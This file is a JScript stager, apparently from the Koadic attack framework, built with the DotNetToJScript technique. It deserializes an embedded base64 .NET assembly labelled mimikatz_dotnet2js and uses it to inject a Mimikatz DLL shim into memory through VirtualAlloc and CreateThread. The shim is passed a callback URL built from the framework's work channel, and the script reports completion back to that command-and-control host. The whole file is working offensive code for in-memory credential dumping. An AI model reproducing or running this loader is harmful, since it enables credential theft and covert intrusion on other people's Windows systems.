function setversion() {
var shell = new ActiveXObject('WScript.Shell');
ver = 'v4.0.30319';
try {
shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
} catch(e) {
ver = 'v2.0.50727';
}
shell.Environment('Process')('COMPLUS_Version') = ver;

}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABQAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAEAxxWQAAAAAA"+
"AAAA4AAiIAsBMAAADAAAAAYAAAAAAABaKgAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"+
"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAACCoA"+
"AE8AAAAAQAAAyAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAANAoAAAcAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"+
"AAAALnRleHQAAABgCgAAACAAAAAMAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAyAMAAABA"+
"AAAABAAAAA4AAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAASAAAAAAAAAAAA"+
"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAADwqAAAAAAAASAAAAAIABQDgIAAA8AcAAAEAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZgIoDgAACgAA"+
"cgEAAHByKQAAcCgPAAAKJioAABMwBgBnAAAAAQAAEQByNwAAcHIpAABwKA8AAAomAygQAAAKCn4R"+
"AAAKBo5pIAAQAAAfQCgDAAAGCwYWBwaOaSgSAAAKABICEgEoEwAACgVqWCgUAAAKFg0EKBUAAAoT"+
"BH4RAAAKFggRBBYSAygEAAAGJioAQlNKQgEAAQAAAAAADAAAAHYyLjAuNTA3MjcAAAAABQBsAAAA"+
"lAIAACN+AAAAAwAAcAMAACNTdHJpbmdzAAAAAHAGAABcAAAAI1VTAMwGAAAQAAAAI0dVSUQAAADc"+
"BgAAFAEAACNCbG9iAAAAAAAAAAIAAAFHFQIUCQAAAAD6ATMAFgAAAQAAABQAAAACAAAABAAAAA0A"+
"AAAVAAAADgAAAAEAAAACAAAAAgAAAAEAAAACAAAAAAAKAgEAAAAAAAYAJgGQAgYAkwGQAgYAcwBe"+
"Ag8AsAIAAAYAmwAuAgYACQEuAgYA6gAuAgYAegEuAgYARgEuAgYAXwEuAgYAsgAuAgYAhwBxAgYA"+
"ZQBxAgYAzQAuAgYALQMnAgoAXwP1AgoARQP1AgYAUgMnAgYAVwInAgYA6AFxAgAAAAATAAAAAAAB"+
"AAEAAQAQAAoDAAA9AAEAAQBQIAAAAACGGFECBgABAGwgAAAAAIYAHABTAAEAAAAAAIAAliAvAFoA"+
"BAAAAAAAgACWIEcAYgAIAAAAAQABAAAAAgAhAgAAAwA+AwAAAQAUAwAAAgC9AQAAAwBUAAAABAA0"+
"AwAAAQC/AgAAAgCxAQAAAwAeAwAABABFAgAABQDSAgIABgA8AAkAUQIBABEAUQIGABkAUQIKACkA"+
"UQIQADEAUQIQADkAUQIQAEEAUQIQAEkAUQIQAFEAUQIQAFkAUQIQAGEAUQIVAGkAUQIQAHEAUQIQ"+
"AHkAUQIGAIEAWgMaAJEAxAEqAJkAQAIwAKEAagMzAJkACwA8AJkAUQJAAKEA1QFFAC4ACwBtAC4A"+
"EwB2AC4AGwCVAC4AIwCeAC4AKwC2AC4AMwC2AC4AOwC2AC4AQwCeAC4ASwC8AC4AUwC2AC4AWwC2"+
"AC4AYwDUAC4AawD+AEMAWwALASEA/QHwAUABBwAvAAEARgEJAEcAAgAEgAAAAQAAAAAAAAAAAAAA"+
"AADiAgAAAgAAAAAAAAAAAAAASgAmAAAAAAACAAAAAAAAAAAAAABKAPUCAAAAAAAAAGRsbEJhc2U2"+
"NABUb0ludDY0ADxNb2R1bGU+AEluamVjdERMTABtc2NvcmxpYgBWaXJ0dWFsQWxsb2MAbHBUaHJl"+
"YWRJZABDcmVhdGVUaHJlYWQAZmxBbGxvY2F0aW9uVHlwZQBHdWlkQXR0cmlidXRlAERlYnVnZ2Fi"+
"bGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFz"+
"c2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNz"+
"ZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUA"+
"Q29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUA"+
"QXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRp"+
"bWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAGR3U3RhY2tTaXplAGR3U2l6ZQBGcm9tQmFzZTY0U3Ry"+
"aW5nAFN0cmluZ1RvSEdsb2JhbFVuaQBNYXJzaGFsAEtlcm5lbDMyLmRsbABrZXJuZWwzMi5kbGwA"+
"bWltaWthdHpfZG90bmV0MmpzLmRsbABwYXJhbQBTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24AWmVy"+
"bwBscFBhcmFtZXRlcgAuY3RvcgBJbnRQdHIAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50"+
"aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVn"+
"Z2luZ01vZGVzAGxwVGhyZWFkQXR0cmlidXRlcwBkd0NyZWF0aW9uRmxhZ3MAbWltaWthdHpfZG90"+
"bmV0MmpzAFN5c3RlbS5XaW5kb3dzLkZvcm1zAFRlc3RDbGFzcwBscEFkZHJlc3MAbHBTdGFydEFk"+
"ZHJlc3MAT2JqZWN0AGZsUHJvdGVjdABvZmZzZXQARGlhbG9nUmVzdWx0AENvbnZlcnQAU2hvdwBN"+
"ZXNzYWdlQm94AENvcHkAAAAnRABPAFQAIABOAEUAVAAgAEMATwBOAFMAVABSAFUAQwBUAE8AUgAA"+
"DVcATwBPAEgATwBPAAAjRABPAFQAIABOAEUAVAAgAEUAWABFAEMAVQBUAEkATwBOAAAAAE1OVQZG"+
"o0OrgmY92sNJmAAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECBgACEUUODggHBR0FGBgJGAUAAR0F"+
"DgIGGAgABAEdBQgYCAMgAAoEIAEBCgQAARgOCLd6XFYZNOCJBiADAQ4OCAcABBgYCAkJCgAGCRgJ"+
"GBgJEAkIAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEABwEAAAAAFwEA"+
"Em1pbWlrYXR6X2RvdG5ldDJqcwAABQEAAAAAFwEAEkNvcHlyaWdodCDCqSAgMjAxNwAAKQEAJDk3"+
"MzEwOWU1LTZiZTAtNGNjOS1iNGU2LTUxODA0YTg2MDk5YwAADAEABzEuMC4wLjAAAAUBAAEAAAAA"+
"AAAAAAAQDHFZAAAAAAIAAAAcAQAA7CgAAOwKAABSU0RTRmuiPdt9p0iG+J45q7b+NwEAAABDOlxV"+
"c2Vyc1xyMDB0XERlc2t0b3Bcd29ya3Nob3BcZ29vZFx3b3Jrc2hvcFxtaW1pa2F0el9kb3RuZXQy"+
"anNcbWltaWthdHpfZG90bmV0MmpzXG9ialxEZWJ1Z1xtaW1pa2F0el9kb3RuZXQyanMucGRiAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAqAAAAAAAAAAAAAEoqAAAAIAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAA8KgAAAAAAAAAAAAAAAF9Db3JEbGxNYWluAG1zY29yZWUuZGxsAAAAAAD/JQAg"+
"ABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA"+
"AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAABsAwAAAAAAAAAAAABsAzQAAABW"+
"AFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAA"+
"PwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAA"+
"AAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEzAIAAAEAUwB0AHIAaQBuAGcA"+
"RgBpAGwAZQBJAG4AZgBvAAAAqAIAAAEAMAAwADAAMAAwADQAYgAwAAAAGgABAAEAQwBvAG0AbQBl"+
"AG4AdABzAAAAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAAAAAAAE4AEwABAEYA"+
"aQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABtAGkAbQBpAGsAYQB0AHoAXwBkAG8AdABu"+
"AGUAdAAyAGoAcwAAAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAxAC4AMAAuADAA"+
"LgAwAAAATgAXAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABtAGkAbQBpAGsAYQB0AHoAXwBk"+
"AG8AdABuAGUAdAAyAGoAcwAuAGQAbABsAAAAAABIABIAAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkA"+
"ZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIAAgADIAMAAxADcAAAAqAAEAAQBMAGUAZwBh"+
"AGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAAAFYAFwABAE8AcgBpAGcAaQBuAGEAbABGAGkA"+
"bABlAG4AYQBtAGUAAABtAGkAbQBpAGsAYQB0AHoAXwBkAG8AdABuAGUAdAAyAGoAcwAuAGQAbABs"+
"AAAAAABGABMAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAG0AaQBtAGkAawBhAHQAegBfAGQA"+
"bwB0AG4AZQB0ADIAagBzAAAAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAx"+
"AC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADEA"+
"LgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAAFw6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZs"+
"ZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA";
var entry_class = 'TestClass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var n = fmt.SurrogateSelector;
	var d = fmt.Deserialize_2(stm);
	al.Add(n);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);

  var shim_lpParam = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + Koadic.work.make_url();

  var base64DLL = "~SHIMX86B64~";

	o.InjectDLL(base64DLL, shim_lpParam, ~SHIMX86OFFSET~);

  Koadic.work.report("Done");
} catch (e) {
  Koadic.work.error(e);
}
